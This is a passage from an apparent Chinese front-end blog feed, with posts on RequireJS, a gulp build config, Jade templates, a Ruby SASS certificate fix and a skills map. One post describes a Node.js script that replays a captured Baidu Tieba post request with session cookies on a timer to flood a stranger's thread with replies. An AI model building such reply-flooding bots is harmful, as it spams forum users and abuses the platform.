class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        name:<span class="string">'luoxia'</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>b模块依赖c模块的情况说明这个问题，然后require是一定根据baseUrl来的</p><h4 id="es2015来了，原生模块语法都支持了，官方是要用原生module语法抛弃CommonJS和AMD-CMD之类的模块规范啊，反正都有babel之类的转换器，为何不用起来呢？es2015的module和之前的一些规范是有区别的，比如引用而非值缓存啊之类的，需要慢慢学习研究哦。"><a href="#es2015来了，原生模块语法都支持了，官方是要用原生module语法抛弃CommonJS和AMD-CMD之类的模块规范啊，反正都有babel之类的转换器，为何不用起来呢？es2015的module和之前的一些规范是有区别的，比如引用而非值缓存啊之类的，需要慢慢学习研究哦。" class="headerlink" title="es2015来了，原生模块语法都支持了，官方是要用原生module语法抛弃CommonJS和AMD,CMD之类的模块规范啊，反正都有babel之类的转换器，为何不用起来呢？es2015的module和之前的一些规范是有区别的，比如引用而非值缓存啊之类的，需要慢慢学习研究哦。"></a>es2015来了，原生模块语法都支持了，官方是要用原生module语法抛弃CommonJS和AMD,CMD之类的模块规范啊，反正都有babel之类的转换器，为何不用起来呢？es2015的module和之前的一些规范是有区别的，比如引用而非值缓存啊之类的，需要慢慢学习研究哦。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h4&gt;&lt;p&gt;模块化开发在如今纷繁复杂的产品开发中显得非常重要，而由于js自身的缺陷，在es6之前，js并没有自己的模块规范，而nodeJS通过CommonJS的模块规范实现了自己的模块机制，但是这仅仅是在node端，而在客户端，有自己的实现方式，诸如AMD,CMD之类，本文是我初次接触AMD规范时遇到的问题总结，而这段序言也是在我后面重新加上的。&lt;br&gt;
    
    </summary>
    
      <category term="前端工程" scheme="http://luoxia.me/code/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="模块化" scheme="http://luoxia.me/code/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
      <category term="requirejs" scheme="http://luoxia.me/code/tags/requirejs/"/>
    
  </entry>
  
  <entry>
    <title>gulp前端自动化</title>
    <link href="http://luoxia.me/code/2016/04/26/gulp%E5%89%8D%E7%AB%AF%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <id>http://luoxia.me/code/2016/04/26/gulp前端自动化/</id>
    <published>2016-04-26T08:16:05.000Z</published>
    <updated>2017-11-16T13:10:06.487Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h4><p>在项目开发过程中，我们会遇到许多重复枯燥的操作，比如当代码修改时，刷新浏览器，代码压缩，编译文件等等，这会降低我们的开发效率，而gulp就是一款前端自动化开发工具，采用pipe流机制，能够对指定文件进行处理，并且能够实时监控文件变化而自动执行相应的任务。这篇文章记录一下gulp的配置使用，这段序言也是后来加上的。<br><a id="more"></a></p><h4 id="gulp是前端开发过程中对代码进行构建的工具，是自动化项目的构建利器；她不仅能对网站资源进行优化，而且在开发过程中很多重复的任务能够使用正确的工具自动完成；使用她，我们不仅可以很愉快的编写代码，而且大大提高我们的工作效率。"><a href="#gulp是前端开发过程中对代码进行构建的工具，是自动化项目的构建利器；她不仅能对网站资源进行优化，而且在开发过程中很多重复的任务能够使用正确的工具自动完成；使用她，我们不仅可以很愉快的编写代码，而且大大提高我们的工作效率。" class="headerlink" title="gulp是前端开发过程中对代码进行构建的工具，是自动化项目的构建利器；她不仅能对网站资源进行优化，而且在开发过程中很多重复的任务能够使用正确的工具自动完成；使用她，我们不仅可以很愉快的编写代码，而且大大提高我们的工作效率。"></a>gulp是前端开发过程中对代码进行构建的工具，是自动化项目的构建利器；她不仅能对网站资源进行优化，而且在开发过程中很多重复的任务能够使用正确的工具自动完成；使用她，我们不仅可以很愉快的编写代码，而且大大提高我们的工作效率。</h4><p>分享我在使用过程中的心得</p><p>使用gulp：</p><ol><li><p>初始化项目，package.json可以帮助我们管理依赖，一个node package有两种依赖，一种是dependencies一种是devDependencies，其中前者依赖的项该是正常运行该包时所需要的依赖项，而后者则是开发的时候需要的依赖项，像一些进行单元测试之类的包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm init</span><br></pre></td></tr></table></figure></li><li><p>全局安装gulp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g gulp</span><br></pre></td></tr></table></figure></li><li><p>局部安装gulp:</p><pre><code>$ npm install --save-dev gulp</code></pre></li><li><p>安装依赖插件:</p><pre><code>$ npm install --save-dev gulp-ruby-sass</code></pre></li><li><p>我的配置:</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//引入依赖模块</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>),</span><br><span class="line">   uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>),</span><br><span class="line">   babel = <span class="built_in">require</span>(<span class="string">'gulp-babel'</span>),</span><br><span class="line">   watch = <span class="built_in">require</span>(<span class="string">'gulp-watch'</span>),</span><br><span class="line">   sass = <span class="built_in">require</span>(<span class="string">'gulp-ruby-sass'</span>),</span><br><span class="line">   autoprefix = <span class="built_in">require</span>(<span class="string">'gulp-autoprefixer'</span>),</span><br><span class="line">   rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>),</span><br><span class="line">   concat = <span class="built_in">require</span>(<span class="string">'gulp-concat'</span>),</span><br><span class="line">   browserSync = <span class="built_in">require</span>(<span class="string">'browser-sync'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//编译sass到css</span></span><br><span class="line">gulp.task(<span class="string">'sass'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sass(<span class="string">'app/sass/*.scss'</span>)</span><br><span class="line">    .on(<span class="string">'error'</span>, sass.logError)</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'build/css/'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//合并多个js文件,压缩，并重命名</span></span><br><span class="line">gulp.task(<span class="string">'concat'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    gulp.src(<span class="string">'build/js/*.js'</span>)</span><br><span class="line">        .pipe(concat(<span class="string">'all.js'</span>))</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(rename(<span class="string">'all.min.js'</span>))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'dist/js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动补全css3浏览器兼容前缀</span></span><br><span class="line">gulp.task(<span class="string">'styles'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  gulp.src([<span class="string">'./build/css/test.css'</span>])</span><br><span class="line">    .pipe(autoprefix(<span class="string">'last 2 versions'</span>))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./dist/css'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//babel转换es2015到es5</span></span><br><span class="line">gulp.task(<span class="string">'babel'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> gulp.src(<span class="string">"app/js/*.js"</span>)<span class="comment">// ES6 源码存放的路径</span></span><br><span class="line">    .pipe(babel(&#123;<span class="attr">presets</span>: [<span class="string">'es2015'</span>]&#125;))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">"build/js"</span>)); <span class="comment">//转换成 ES5 存放的路径</span></span><br><span class="line">   &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//监控es2015文件，sass文件，自动编译为es5文件，css文件</span></span><br><span class="line">gulp.task(<span class="string">'watch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   gulp.watch([<span class="string">'app/js/es2015.js'</span>,<span class="string">'app/sass/*.scss'</span>], [<span class="string">'babel'</span>,<span class="string">'sass'</span>]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//浏览器实时自动更新状态，不用手动刷新</span></span><br><span class="line">gulp.task(<span class="string">'browser-sync'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> files = [</span><br><span class="line">      <span class="string">'app/**/*'</span></span><br><span class="line">   ];</span><br><span class="line">   browserSync.init(files, &#123;</span><br><span class="line">      server: &#123;</span><br><span class="line">         baseDir: [<span class="string">'./app/html'</span>,<span class="string">'./app/'</span>]</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h4&gt;&lt;p&gt;在项目开发过程中，我们会遇到许多重复枯燥的操作，比如当代码修改时，刷新浏览器，代码压缩，编译文件等等，这会降低我们的开发效率，而gulp就是一款前端自动化开发工具，采用pipe流机制，能够对指定文件进行处理，并且能够实时监控文件变化而自动执行相应的任务。这篇文章记录一下gulp的配置使用，这段序言也是后来加上的。&lt;br&gt;
    
    </summary>
    
      <category term="前端工程" scheme="http://luoxia.me/code/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="gulp" scheme="http://luoxia.me/code/tags/gulp/"/>
    
      <category term="前端自动化" scheme="http://luoxia.me/code/tags/%E5%89%8D%E7%AB%AF%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>js模板引擎初体验之jade</title>
    <link href="http://luoxia.me/code/2016/04/22/js%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%9D%E4%BD%93%E9%AA%8C%E4%B9%8Bjade/"/>
    <id>http://luoxia.me/code/2016/04/22/js模板引擎初体验之jade/</id>
    <published>2016-04-22T11:22:42.000Z</published>
    <updated>2017-11-16T13:10:06.488Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h4><p>jade是一款基于NodeJS的js模板引擎，采用缩进的风格书写html,使得我们可以不用关注标签的闭合，模板引擎可供服务端渲染和客户端渲染，模板引擎能够将数据和视图分离，通过动态的传入数据，模板引擎可以渲染出结构相同，数据有差异的页面。<br> <a id="more"></a></p><h3 id="因为nodejs而接触了jade模板引擎，它可以提高前端开发的效率"><a href="#因为nodejs而接触了jade模板引擎，它可以提高前端开发的效率" class="headerlink" title="因为nodejs而接触了jade模板引擎，它可以提高前端开发的效率"></a>因为nodejs而接触了jade模板引擎，它可以提高前端开发的效率</h3><h4 id="这篇博文我想写一下利用jade模板引擎更好的和后台对接，动态生成html页面"><a href="#这篇博文我想写一下利用jade模板引擎更好的和后台对接，动态生成html页面" class="headerlink" title="这篇博文我想写一下利用jade模板引擎更好的和后台对接，动态生成html页面"></a>这篇博文我想写一下利用jade模板引擎更好的和后台对接，动态生成html页面</h4><p>之前的项目中，我是这么干的：通过ajax获取服务器返回的json数据,然后通过拼接字符串的形式来生成dom，再插入到页面。</p><p>jade在html元素内容中引入变量<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p #&#123;content&#125;  //content变量表示文章内容</span><br></pre></td></tr></table></figure></p><p>通过each循环变量数组或对象<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- var array = ['jack','jane','marry']</span><br><span class="line">- var obj = &#123;name:'luoxia',girlfriend:'null'&#125;</span><br><span class="line">ul</span><br><span class="line">each item in array</span><br><span class="line">li item</span><br><span class="line"></span><br><span class="line">each key,value in obj</span><br><span class="line">p #&#123;key&#125;:#&#123;value&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果”:</p><pre><code>&lt;ul&gt;    &lt;li&gt;jack&lt;/li&gt;    &lt;li&gt;jane&lt;/li&gt;    &lt;li&gt;marry&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;name:luoxia&lt;/p&gt;&lt;p&gt;girlfriend:null&lt;/p&gt;</code></pre><p>现在加入要从服务器获取某个表格内容，而这个表格的内容是不断变化的，而且表格项数不确定，我们可以通过ajax获取一个包含表格内容的json对象（这里运用bootstrap框架)</p><pre><code>//backData:{    sections:[{class:&apos;active&apos;,name:&apos;罗峡&apos;,addr:&apos;中国重庆&apos;},{class:&apos;info&apos;,name:&apos;小明&apos;,addr:&apos;火星&apos;},        {class:&apos;warning&apos;,name:&apos;大明&apos;,addr:&apos;遥远的地方&apos;}]};</code></pre><p>书写jade模板</p><pre><code>//table.jadetable(class=&apos;table table-bordered table-hover&apos;)thead    tr        td 姓名        td 地址tbody    each section in sections        tr(class=&apos;#{section.class}&apos;)            td #{section.name}            td #{section.addr}</code></pre><p>编译成模板js脚本</p><pre><code>$ jade --client --no-debug table.jaderendered table.js</code></pre><p>在页面中引入jade的runtimejs文件和table.js文件,最后通过将json传递给table.js暴露出的方法</p><pre><code>var addHtml = template(backData);document.body.innerHTML = addHtml;</code></pre><p>这样，动态生成格式类似的代码块就完成了。一个漂亮的表格:<br><img src="http://7xsi10.com2.z0.glb.clouddn.com/table.png" alt="table"></p><p>在es2015语法中新增了一种叫做模板字符串的字符串字面量，模板字符串以反引号代替一般字符串的引号和双引号，变量或者表达式通过占位符${}语法来引入。但模板字符串本身不支持条件或循环等模板引擎类似的语法:</p><pre><code>ul    for (var k in lis)        li= lis[k]</code></pre><p>嗯，但是es2015里有个东西叫做标签模板的东西，什么叫标签模板呢，就是一个标签（实际上是一个函数）后跟上模板字符串，而这个模板字符串会被作为参数传入前面的标签函数，第一个参数是未被占位符替换的部分组成的数组，而后面的参数都是各个变量，我们可以通过标签模板自定义功能：</p><pre><code>let lis = [&apos;luoxia is good&apos;,&apos;luoxia is very good&apos;,&apos;luoxia can\&apos;t be more good&apos;];function addLis(s,...array){    let string = &apos;&apos;;    string += s[0];    for(let i=0; i&lt;array[0].length;i++){        string +=        `        &lt;li&gt;            ${array[0][i]}        &lt;/li&gt;`;    }    string += s[1];    return string;}console.log(addLis `&lt;ul&gt;            ${lis}&lt;/ul&gt;`);    /*            $ node es2015.js&lt;ul&gt;        &lt;li&gt;            luoxia is good        &lt;/li&gt;        &lt;li&gt;            luoxia is very good        &lt;/li&gt;        &lt;li&gt;            luoxia can&apos;t be more good        &lt;/li&gt;&lt;/ul&gt;    */</code></pre><p>不过略显麻烦啊感觉有木有（或许是我实现得麻烦）</p><p>前端技术瞬息万变，模板引擎的时代或许早已过去，但是我们可以在学习中去体会它的思想，发现它的不足，在对比中成长，然后在实践中找到更适合具体场景的技术，不在追逐中迷失自我，而是让自己的心智，能力得到成长。（菜鸟的自白，不喜勿喷）</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h4&gt;&lt;p&gt;jade是一款基于NodeJS的js模板引擎，采用缩进的风格书写html,使得我们可以不用关注标签的闭合，模板引擎可供服务端渲染和客户端渲染，模板引擎能够将数据和视图分离，通过动态的传入数据，模板引擎可以渲染出结构相同，数据有差异的页面。&lt;br&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="js模板引擎" scheme="http://luoxia.me/code/tags/js%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/"/>
    
      <category term="jade" scheme="http://luoxia.me/code/tags/jade/"/>
    
  </entry>
  
  <entry>
    <title>nodejs刷百度贴吧回复</title>
    <link href="http://luoxia.me/code/2016/04/21/nodejs%E5%88%B7%E7%99%BE%E5%BA%A6%E8%B4%B4%E5%90%A7%E5%9B%9E%E5%A4%8D/"/>
    <id>http://luoxia.me/code/2016/04/21/nodejs刷百度贴吧回复/</id>
    <published>2016-04-21T15:15:57.000Z</published>
    <updated>2017-11-16T13:10:06.488Z</updated>
    
    <content type="html"><![CDATA[<p>nodeJS提供的网络API，使得nodeJS既能作为服务端接受请求，又能作为客户端像其他服务器发起请求，对于一些论坛诸如贴吧之类的，可以通过请求信息（cookie信息)就能够实现脚本自动发帖，这是初次接触nodeJS的尝试，虽然用到的技术较简单，但是还是挺有趣的，比如你想给自己顶贴之类的小需求，可以自己写一个刷回复的脚步来实现哦！ <a id="more"></a></p><h3 id="作为前端必备技能的nodejs-非常有趣"><a href="#作为前端必备技能的nodejs-非常有趣" class="headerlink" title="作为前端必备技能的nodejs,非常有趣"></a>作为前端必备技能的nodejs,非常有趣</h3><h4 id="利用NodeJs的http模块，很简单地就能做一个刷回复的脚本"><a href="#利用NodeJs的http模块，很简单地就能做一个刷回复的脚本" class="headerlink" title="利用NodeJs的http模块，很简单地就能做一个刷回复的脚本"></a>利用NodeJs的http模块，很简单地就能做一个刷回复的脚本</h4><p>这次借用高考吧一学妹的帖子来刷一刷，哈哈，邪恶邪恶<br><img src="http://7xsi10.com2.z0.glb.clouddn.com/shua1.png" alt="tie"><br>nodejs提供的http模块，我们需要用http模块的request方法想服务端发送请求来发送/接收信息</p><ol><li><p>require进两个模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br></pre></td></tr></table></figure></li><li><p>request方法返回一个http.ClientRequest的实例，如果用POST方法向服务端发送数据，数据对象会被写入该对象，request方法接受两个参数，一个必须的options参数，一个可选的callback函数，callback函数可以接受到来自服务端的响应作为参数，options参数可以为字符串或者对象，字符串会被url模块的parse方法序列化为对象</p></li><li>打开学妹的帖子，我们编辑一条回复信息，然后查看网络面板，查看add的ajax请求信息<br><img src="http://7xsi10.com2.z0.glb.clouddn.com/shua2.png" alt="add"></li><li>options参数的header属性值为请求头信息，当然得是Json对象</li><li>注意Content-Length要设置为postData.length，不然可能请求失败</li><li>在最开始的时候，老是出现如下错误:<br><img src="http://7xsi10.com2.z0.glb.clouddn.com/shua3.png" alt="error"><br>最后查阅错误代码，stackoverflow上的解决办法是不加http/https协议，果然，成功<br><img src="http://7xsi10.com2.z0.glb.clouddn.com/shua4.png" alt="success"></li><li>然后，邪恶的加个定时器，一直刷，看结果<br><img src="http://7xsi10.com2.z0.glb.clouddn.com/many.png" alt="many"><br><img src="http://7xsi10.com2.z0.glb.clouddn.com/shua6.png" alt="many"></li><li>很好玩吧，不过多次刷会出现验证码的，哎，刚学，知识技能不熟悉，只能写个简单的yy一下了，不过这测验也能看出百度的安全并不是那么好，哈哈</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;nodeJS提供的网络API，使得nodeJS既能作为服务端接受请求，又能作为客户端像其他服务器发起请求，对于一些论坛诸如贴吧之类的，可以通过请求信息（cookie信息)就能够实现脚本自动发帖，这是初次接触nodeJS的尝试，虽然用到的技术较简单，但是还是挺有趣的，比如你想给自己顶贴之类的小需求，可以自己写一个刷回复的脚步来实现哦！
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="nodejs" scheme="http://luoxia.me/code/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>ruby-sass-problem</title>
    <link href="http://luoxia.me/code/2016/04/10/ruby-sass-problem/"/>
    <id>http://luoxia.me/code/2016/04/10/ruby-sass-problem/</id>
    <published>2016-04-10T15:25:08.000Z</published>
    <updated>2017-11-16T13:10:06.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于windows下通过ruby安装sass和compass的问题"><a href="#关于windows下通过ruby安装sass和compass的问题" class="headerlink" title="关于windows下通过ruby安装sass和compass的问题"></a>关于windows下通过ruby安装sass和compass的问题</h1><h3 id="安装sass和compass"><a href="#安装sass和compass" class="headerlink" title="安装sass和compass"></a>安装sass和compass</h3><a id="more"></a><p>执行 gem sources -a <a href="https://ruby.taobao.org/出现如下错误" target="_blank" rel="noopener">https://ruby.taobao.org/出现如下错误</a><br><img src="http://7xsi10.com2.z0.glb.clouddn.com/QQ%E5%9B%BE%E7%89%8720160410233014.png" alt="error"><br>缺少SSL证书</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ol><li>下载证书：<a href="https://curl.haxx.se/ca/cacert.pem" target="_blank" rel="noopener">官方地址</a>　<a href="http://pan.baidu.com/s/1pKJSlOf" target="_blank" rel="noopener">百度云盘</a></li><li>将证书保存，比如我的保存到了C:\Ruby22-x64。</li><li>配置证书的环境<img src="http://7xsi10.com2.z0.glb.clouddn.com/870258-20160405180306187-1063124604.png" alt="path"></li><li>重启，再执行，当当当当，哈哈，成功了<img src="http://7xsi10.com2.z0.glb.clouddn.com/QQ%E5%9B%BE%E7%89%8720160410233111.png" alt="succed"><h5 id="感谢angular社区前辈-会飞的鱼lala-提供的方法"><a href="#感谢angular社区前辈-会飞的鱼lala-提供的方法" class="headerlink" title="感谢angular社区前辈 会飞的鱼lala 提供的方法"></a>感谢angular社区前辈 会飞的鱼lala 提供的方法</h5></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于windows下通过ruby安装sass和compass的问题&quot;&gt;&lt;a href=&quot;#关于windows下通过ruby安装sass和compass的问题&quot; class=&quot;headerlink&quot; title=&quot;关于windows下通过ruby安装sass和compass的问题&quot;&gt;&lt;/a&gt;关于windows下通过ruby安装sass和compass的问题&lt;/h1&gt;&lt;h3 id=&quot;安装sass和compass&quot;&gt;&lt;a href=&quot;#安装sass和compass&quot; class=&quot;headerlink&quot; title=&quot;安装sass和compass&quot;&gt;&lt;/a&gt;安装sass和compass&lt;/h3&gt;
    
    </summary>
    
      <category term="css" scheme="http://luoxia.me/code/categories/css/"/>
    
    
      <category term="sass" scheme="http://luoxia.me/code/tags/sass/"/>
    
  </entry>
  
  <entry>
    <title>front end technology</title>
    <link href="http://luoxia.me/code/2016/03/14/front-end-technology/"/>
    <id>http://luoxia.me/code/2016/03/14/front-end-technology/</id>
    <published>2016-03-14T04:41:45.000Z</published>
    <updated>2017-11-16T13:10:06.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2015-2016-前端技能体系图"><a href="#2015-2016-前端技能体系图" class="headerlink" title="2015-2016 前端技能体系图"></a>2015-2016 前端技能体系图</h2><h3 id="转自ouvens的github"><a href="#转自ouvens的github" class="headerlink" title="转自ouvens的github"></a>转自ouvens的github</h3><p>茫茫前端大海，学海无涯，苦作舟  <a id="more"></a><br><img src="http://static.open-open.com/news/uploadImg/20160126/20160126133319_831.png" alt="前端知识体系图"></p><h2 id="一、框架与组件"><a href="#一、框架与组件" class="headerlink" title="一、框架与组件"></a>一、框架与组件</h2><h3 id="bootstrap等UI框架设计与实现"><a href="#bootstrap等UI框架设计与实现" class="headerlink" title="bootstrap等UI框架设计与实现"></a>bootstrap等UI框架设计与实现</h3><ul><li><p>伸缩布局：grid网格布局</p></li><li><p>基础UI样式：元素reset、按钮、图片、菜单、表单</p></li><li><p>组件UI样式：按钮组、字体图标、下拉菜单、输入框组、导航组、面包屑、分页、标签、轮播、弹出框、列表、多媒体、警告</p></li><li><p>响应式布局：布局、结构、样式、媒体、javascript响应式</p></li><li><p>第三方插件：插件管理</p></li></ul><h3 id="jQuery、zepto使用原理以及插件开发"><a href="#jQuery、zepto使用原理以及插件开发" class="headerlink" title="jQuery、zepto使用原理以及插件开发"></a>jQuery、zepto使用原理以及插件开发</h3><ul><li><p>支持amd、cmd、全局变量的模块化封装</p></li><li><p>$.fn.method = function(){}</p></li></ul><h3 id="mvc-mvvm框架原理设计，vue-angular-avalon等"><a href="#mvc-mvvm框架原理设计，vue-angular-avalon等" class="headerlink" title="mvc/mvvm框架原理设计，vue/angular/avalon等"></a>mvc/mvvm框架原理设计，vue/angular/avalon等</h3><ul><li><p>directive设计：html、text、class、html、attr、repeat、ref，可扩展</p></li><li><p>filter设计：bool、upperCase、lowerCase，可扩展</p></li><li><p>表达式设计：if-else等实现</p></li><li><p>viewmodel结构设计：例如数据，元素，方法的挂载与作用域</p></li><li><p>数据更变检测：函数触发，脏数据检测、对象hijacking</p></li></ul><h3 id="polymer-angular2思想与设计思路"><a href="#polymer-angular2思想与设计思路" class="headerlink" title="polymer/angular2思想与设计思路"></a>polymer/angular2思想与设计思路</h3><ul><li><p>import技术</p></li><li><p>template和script引入方式</p></li><li><p>css样式命名空间隔离</p></li><li><p>简单复用第三方库</p></li></ul><h3 id="reactjs原理与使用"><a href="#reactjs原理与使用" class="headerlink" title="reactjs原理与使用"></a>reactjs原理与使用</h3><ul><li><p>virtual dom单向数据绑定</p></li><li><p>js执行语法方式</p></li><li><p>UI由状态控制</p></li></ul><h3 id="commonJS-AMD-CMD"><a href="#commonJS-AMD-CMD" class="headerlink" title="commonJS/AMD/CMD"></a>commonJS/AMD/CMD</h3><ul><li><p>模块引入</p></li><li><p>模块定义</p></li><li><p>模块标识</p></li><li><p>UMD解决不同规范兼容性的问题，例如webpack封装</p></li><li><p>模块懒执行(CMD)与与预执行(AMD)</p></li></ul><h3 id="loadJs模块化加载原理与实现"><a href="#loadJs模块化加载原理与实现" class="headerlink" title="loadJs模块化加载原理与实现"></a>loadJs模块化加载原理与实现</h3><ul><li><p>创建script标签，需要id映射到资源url</p></li><li><p>onload加载模块队列判断</p></li><li><p>全部加载完成后触发</p></li><li><p>加载失败问题优化</p></li><li><p>requirejs、modjs、seajs</p></li></ul><h3 id="polyfill、shim原理与实现"><a href="#polyfill、shim原理与实现" class="headerlink" title="polyfill、shim原理与实现"></a>polyfill、shim原理与实现</h3><ul><li><p>polyfill提供了开发者们希望浏览器原生提供支持的功能特性</p></li><li><p>shim将新的API引入到旧的环境中,且仅靠旧环境中已有的手段实现</p></li></ul><h3 id="virtual-Dom、Incremental-DOM"><a href="#virtual-Dom、Incremental-DOM" class="headerlink" title="virtual Dom、Incremental DOM"></a>virtual Dom、Incremental DOM</h3><ul><li><p>1.用js对象树表示dom树结构，根据该对象树构建dom树</p></li><li><p>2.状态改变时，重新构建对象，和旧的对象对比，记录两个对象树差异</p></li><li><p>3.将对象树差异应用到dom中</p></li><li><p>小结:js对象模拟dom(elem.js)，virtual dom diff算法(diff.js)、差异渲染dom(patch.js)</p></li><li><p>incremental dom在状态改变时扫描旧对象树将差异直接应用到dom中</p></li></ul><h3 id="shadow-dom"><a href="#shadow-dom" class="headerlink" title="shadow dom"></a>shadow dom</h3><ul><li><p>隔离外部环境用于封装组件：结构、样式、行为</p></li><li><p>实现形式：新标签、class类属性 + 构建编译</p></li></ul><h3 id="webwork与service-Worker"><a href="#webwork与service-Worker" class="headerlink" title="webwork与service Worker"></a>webwork与service Worker</h3><ul><li><p>webwork与主线程机制，on/post</p></li><li><p>serviceworker可作为浏览器请求代理</p></li><li><p>应用场景</p></li></ul><h3 id="ES6转ES5、Babel与ES6开发规范体系"><a href="#ES6转ES5、Babel与ES6开发规范体系" class="headerlink" title="ES6转ES5、Babel与ES6开发规范体系"></a>ES6转ES5、Babel与ES6开发规范体系</h3><ul><li><p>ES6编码规范全</p></li><li><p>ES6在babel下兼容性</p></li><li><p>ES6在node下兼容性与性能</p></li><li><p>ES6新特性：看编码规范</p></li><li><p>aurelia ES6前端框架</p></li></ul><h3 id="Isomorphic-JavaScript"><a href="#Isomorphic-JavaScript" class="headerlink" 